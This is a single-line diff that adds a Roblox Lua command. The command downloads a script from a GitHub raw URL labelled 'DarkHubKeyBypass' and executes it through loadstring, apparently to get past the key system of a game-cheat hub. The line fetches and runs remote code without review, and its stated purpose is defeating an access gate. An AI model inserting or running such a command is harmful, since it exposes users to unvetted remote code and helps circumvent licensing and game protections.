@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scowlol/ScowScripts/main/DarkHubKeyBypass/Code"),true)()
